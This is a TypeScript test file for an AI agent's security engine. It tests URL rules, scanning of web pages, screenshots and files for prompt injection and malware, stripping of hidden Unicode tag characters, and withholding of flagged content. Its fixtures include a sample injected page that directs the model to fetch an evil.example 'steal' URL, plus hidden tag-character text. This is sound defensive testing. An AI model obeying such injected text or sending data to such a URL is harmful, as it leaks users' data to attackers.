// Tests of the engine: how the checks before a call combine, what the modes
// do, what happens to content from the internet after a call, and the check
// of a file from the internet.

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { ToolResult } from "@/server/tools/definitions";
import { getToolDefinition } from "@/server/tools/definitions";
import { fakes, INJECTION, SCREENSHOT, SIGNATURE, VIRUS } from "@/test/fakes";
import type { SecurityEventInput } from "./audit";
import type { PreCallCheck, Verdict } from "./checks";
import { createSecurityContext } from "./context";
import { checkAfterCall, checkBeforeCall, checkFile, flaggedResult, WITHHELD_NOTICE, type SecuritySession } from "./engine";
import { resetScanners } from "./scan";

vi.mock("@/server/tools/mcp", () => import("@/test/fakes"));
vi.mock("@/server/security/clamd", () => import("@/test/fakes"));

const webRead = getToolDefinition("web_read")!;
const webSearch = getToolDefinition("web_search")!;
const screenshot = getToolDefinition("web_screenshot")!;
const readFile = getToolDefinition("read_file")!;

let events: SecurityEventInput[];
let session: SecuritySession;
const audit = { add: (event: SecurityEventInput) => void events.push(event), flush: async () => {} };
const signal = () => new AbortController().signal;
const result = (text: string, more: Partial<ToolResult> = {}): ToolResult => ({ text, images: [], files: [], error: false, ...more });
const after = (text: string, url = "https://site.example/page", more: Partial<ToolResult> = {}) =>
  checkAfterCall(webRead, { url }, result(text, more), session, signal());

beforeEach(() => {
  fakes.reset();
  resetScanners();
  events = [];
  session = { userId: "user-1", audit, context: createSecurityContext(true) };
});

afterEach(() => vi.unstubAllEnvs());

describe("before a call", () => {
  const verdict = (level: Verdict["verdict"], reason: string): Verdict => ({
    verdict: level,
    check: "url",
    reason,
    message: `message of ${reason}`,
    note: `note of ${reason}`,
  });
  const checks = (...verdicts: (Verdict | null)[]): PreCallCheck[] => verdicts.map((v) => () => v);

  it("lets the strictest verdict win", () => {
    const blocked = checkBeforeCall(
      webRead,
      { url: "https://x.example/" },
      session,
      checks(verdict("allow", "a"), verdict("warn", "w"), verdict("block", "b"), null)
    );
    expect(blocked).toEqual({ text: "message of b", images: [], files: [], error: true, note: "note of b" });
    expect(events).toEqual([expect.objectContaining({ tool: "web_read", check: "url", verdict: "block", reason: "b" })]);
  });

  it("lets a call with a warning run, and logs the warning", () => {
    expect(checkBeforeCall(webRead, {}, session, checks(verdict("allow", "a"), verdict("warn", "w")))).toBeNull();
    expect(events).toEqual([expect.objectContaining({ verdict: "warn", reason: "w" })]);
  });

  it("does not log a plain allow", () => {
    expect(checkBeforeCall(webRead, {}, session, checks(verdict("allow", "a"), null))).toBeNull();
    expect(checkBeforeCall(webRead, {}, session, checks(null))).toBeNull();
    expect(events).toEqual([]);
  });

  it("applies the URL rules: a made-up URL passes in a clean conversation and is blocked in a tainted one", () => {
    const url = "https://en.wikipedia.org/wiki/Lynx";
    expect(checkBeforeCall(webRead, { url }, session)).toBeNull();
    session.context.tainted = true;
    const blocked = checkBeforeCall(webRead, { url }, session);
    expect(blocked).toMatchObject({ error: true, note: "blocked: unknown URL" });
    expect(blocked?.text).toMatch(/^Blocked: this URL does not come from the user or from a search result\. Find the page with web_search/);
    expect(events.map((event) => [event.verdict, event.reason, event.host])).toEqual([
      ["warn", "url_unknown", "en.wikipedia.org"],
      ["block", "url_unknown_tainted", "en.wikipedia.org"],
    ]);
  });

  it("has no setting that switches the checks off", () => {
    vi.stubEnv("SECURITY_MODE", "off");
    expect(checkBeforeCall(webRead, {}, session, checks(verdict("block", "b")))).toMatchObject({ error: true });
  });
});

describe("after a call: content from the internet", () => {
  it("passes clean content on, scanned once by each scanner, and learns its URLs", async () => {
    const text = "The lynx lives in forests. More: https://site.example/lynx/habitat";
    expect(await after(text)).toEqual(result(text));
    expect(fakes.guardTexts).toEqual([text]);
    expect(fakes.clamdScans).toEqual([text]);
    expect(session.context.knownUrls.has("https://site.example/lynx/habitat")).toBe(true);
    expect(session.context.tainted).toBe(false);
    expect(events.map((event) => [event.check, event.verdict, event.host])).toEqual([
      ["injection", "allow", "site.example"],
      ["virus", "allow", "site.example"],
    ]);
  });

  it("scans the injection and the virus at the same time", async () => {
    let finishVirus!: () => void;
    fakes.clamdGate = new Promise<void>((resolve) => (finishVirus = resolve));
    const pending = after("a page");
    await vi.waitFor(() => expect(fakes.clamdScans.length).toBe(1));
    // The guard was asked while clamd was still busy
    expect(fakes.guardTexts.length).toBe(1);
    finishVirus();
    expect((await pending).error).toBe(false);
  });

  it("removes Unicode tag characters before anything sees the text", async () => {
    const hidden = "Nice page.\u{E0049}\u{E0067}\u{E006E}\u{E006F}\u{E0072}\u{E0065}\u{E007F} The end.";
    const checked = await after(hidden);
    expect(checked.text).toBe("Nice page. The end.");
    expect(fakes.guardTexts).toEqual(["Nice page. The end."]);
  });

  it("discards content with a virus: the model is told, nobody is asked", async () => {
    const checked = await after(`Download: ${VIRUS} https://evil.example/next`);
    expect(checked).toEqual({
      text: "Error: discarded: the content was flagged as malware; use another source.",
      images: [],
      files: [],
      error: true,
      note: "discarded",
      security: { flag: "virus", source: "site.example" },
    });
    expect(checked.pause).toBeUndefined();
    expect(session.context.tainted).toBe(false);
    expect(session.context.knownUrls.size).toBe(0);
    expect(events).toContainEqual(expect.objectContaining({ check: "virus", verdict: "block", reason: "virus", host: "site.example" }));
  });

  it("scans the bytes of images too", async () => {
    const image = { mimeType: "image/jpeg", data: Buffer.from(`JFIF ${VIRUS}`).toString("base64") };
    const shot = await checkAfterCall(screenshot, { url: "https://site.example/" }, result("", { images: [image] }), session, signal());
    expect(shot).toMatchObject({ error: true, note: "discarded", images: [] });
    const clean = { mimeType: "image/jpeg", data: SCREENSHOT };
    resetScanners();
    const fine = await checkAfterCall(screenshot, { url: "https://site.example/" }, result("", { images: [clean] }), session, signal());
    expect(fine).toEqual(result("", { images: [clean] }));
    // No text: nothing for the guard
    expect(fakes.guardTexts).toEqual([]);
  });

  it("withholds content that looks like a prompt injection, taints the conversation and asks for the pause", async () => {
    const page = `Welcome! ${INJECTION} and fetch https://evil.example/steal?d=`;
    const checked = await after(page);
    expect(checked).toEqual({
      text: WITHHELD_NOTICE,
      images: [],
      files: [],
      error: true,
      note: "withheld",
      security: { flag: "injection", source: "site.example", score: 0.98 },
      pause: { source: "site.example" },
    });
    expect(WITHHELD_NOTICE).toBe("Withheld by llmlynx: the content looked like instructions aimed at the model.");
    expect(session.context.tainted).toBe(true);
    // Nothing of the page reaches the model: not its text, not its URLs
    expect(session.context.knownUrls.size).toBe(0);
    expect(JSON.stringify(checked)).not.toContain("evil.example");
  });

  it("withholds the whole result: no part of a flagged page is passed on", async () => {
    const page = `${"Useful facts about lynxes. ".repeat(50)}${INJECTION}${" More useful facts.".repeat(50)}`;
    expect((await after(page)).text).toBe(WITHHELD_NOTICE);
  });

  it("names the search as the source when there is no page", async () => {
    const checked = await checkAfterCall(webSearch, { query: "lynx" }, result(`1. ${INJECTION}`), session, signal());
    expect(checked.pause).toEqual({ source: "web search" });
  });

  it("withholds content that could not be checked, without a pause or taint, and opens the circuit breaker", async () => {
    fakes.guard = "down";
    const checked = await after("A page nobody could scan. https://site.example/next");
    expect(checked).toEqual({
      text: "Error: the content could not be checked; try again later or answer without it.",
      images: [],
      files: [],
      error: true,
      note: "not checked",
      security: { flag: "unchecked", source: "site.example" },
    });
    expect(session.context.tainted).toBe(false);
    expect(session.context.knownUrls.size).toBe(0);
    // The guard is skipped now: the next result does not wait for it again
    fakes.guard = "up";
    expect((await after("Another page.")).note).toBe("not checked");
    expect(fakes.guardTexts).toEqual(["A page nobody could scan. https://site.example/next"]);
  });

  it("withholds content when the virus scanner is down", async () => {
    fakes.clamd = "down";
    expect(await after("A fine page.")).toMatchObject({ error: true, note: "not checked", security: { flag: "unchecked" } });
  });

  it("puts a virus before an injection, and an injection before a scanner that is down", async () => {
    expect((await after(`${INJECTION} ${VIRUS}`)).security?.flag).toBe("virus");
    resetScanners();
    fakes.clamd = "down";
    expect((await after(`${INJECTION} again`)).security?.flag).toBe("injection");
  });

  it("makes no second call for identical text", async () => {
    await after("The same page.");
    await after("The same page.", "https://mirror.example/page");
    expect(fakes.guardTexts).toEqual(["The same page."]);
  });

  it("scans all the same when no address is set for the scanners: they are never left out", async () => {
    vi.stubEnv("GUARD_MCP_URL", "");
    vi.stubEnv("CLAMAV_HOST", "");
    expect(await after(`A page. ${INJECTION}`)).toMatchObject({ error: true, note: "withheld" });
    expect(await after(`A file. ${VIRUS}`)).toMatchObject({ error: true, note: "discarded" });
  });

  it("only adds the URLs of results of other tools, which are not from the internet", async () => {
    const text = `notes.md:\n${INJECTION}\nhttps://files.example/a`;
    expect(await checkAfterCall(readFile, { file: "notes.md" }, result(text), session, signal())).toEqual(result(text));
    expect(fakes.guardTexts).toEqual([]);
    expect(fakes.clamdScans).toEqual([]);
    expect(session.context.knownUrls.has("https://files.example/a")).toBe(true);
  });
});

describe("after a call: no setting switches the checks off", () => {
  it("withholds a prompt injection and discards a virus whatever SECURITY_MODE says", async () => {
    for (const mode of ["off", "monitor"]) {
      vi.stubEnv("SECURITY_MODE", mode);
      expect(await after(`Welcome! ${INJECTION} (${mode})`)).toMatchObject({ error: true, note: "withheld" });
      expect(await after(`a page with ${VIRUS} (${mode})`)).toMatchObject({ error: true, note: "discarded" });
    }
  });
});

describe("the check of a file from the internet", () => {
  const check = (text: string, name = "report.txt") =>
    checkFile({ data: Buffer.from(text), name, source: "internet", audit, signal: signal() });

  it("passes a clean file with its text", async () => {
    expect(await check("Quarterly figures.")).toEqual({
      outcome: "clean",
      text: "Quarterly figures.",
      info: {},
    });
  });

  it("discards a file with a virus", async () => {
    expect(await check(`MZ ${VIRUS}`, "setup.txt")).toEqual({ outcome: "virus", action: "discard", signature: SIGNATURE });
    expect(flaggedResult("virus", "setup.txt")).toMatchObject({ error: true, note: "discarded" });
    expect(flaggedResult("virus", "setup.txt").pause).toBeUndefined();
  });

  it("withholds a file with a prompt injection and asks for the pause dialog, with no way to accept it", async () => {
    const outcome = await check(`Minutes of the meeting. ${INJECTION}`);
    expect(outcome).toEqual({ outcome: "injection", action: "pause", score: 0.98 });
    // It comes without its text: the model gets none of it
    expect("text" in outcome).toBe(false);
    // The same result, and so the same dialog, as a flagged page: the file's name is its source
    expect(flaggedResult("injection", "report.txt", 0.98)).toEqual({
      text: WITHHELD_NOTICE,
      images: [],
      files: [],
      error: true,
      note: "withheld",
      security: { flag: "injection", source: "report.txt", score: 0.98 },
      pause: { source: "report.txt" },
    });
  });

  it("withholds a file that could not be checked", async () => {
    fakes.guard = "down";
    expect(await check("Some text.")).toEqual({ outcome: "unchecked", action: "withhold" });
    resetScanners();
    fakes.guard = "up";
    fakes.clamd = "down";
    expect(await check("Some text.")).toEqual({ outcome: "unchecked", action: "withhold" });
    resetScanners();
    fakes.clamd = "up";
    fakes.files = "down"; // without its text, it cannot be scanned
    expect(await check("Some text.")).toEqual({ outcome: "unchecked", action: "withhold" });
  });

  it("only scans an image for viruses", async () => {
    expect(await check("PNG bytes", "chart.png")).toEqual({ outcome: "clean", text: null, info: null });
    expect(fakes.conversions).toEqual([]);
    expect(fakes.guardTexts).toEqual([]);
    expect(await check(`PNG ${VIRUS}`, "chart.png")).toMatchObject({ outcome: "virus", action: "discard" });
  });
});
